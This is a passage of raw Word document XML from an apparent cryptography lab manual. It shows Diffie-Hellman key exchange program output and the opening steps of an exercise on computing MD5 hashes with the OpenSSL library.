      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5353"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId28">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 .</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>a.o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5977"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"q"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>353</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4339"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a No "xa" wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue of q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>97</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4205"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a No "xb" </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e of q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>233</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="100" w:right="7655"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>pha</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:t>3 ya = 40</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8085"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>yb =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>248 ka = 160 kb =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>160</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3390"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he secr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keys gener</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed by User</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>ser B are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</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right="8213"/>
        <w:jc w:val="both"/>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610" w:right="975" w:hanging="4510"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 9                                                                                                             </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ate: MD5</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42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420" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="853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 xml:space="preserve">MD5 hash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>echn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng openssl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>brary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n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t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue of s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2. In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP_ge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>byna</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e func</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on and pass on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>MD5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>e d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>se d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>Upd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e() fun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hash by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es of da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
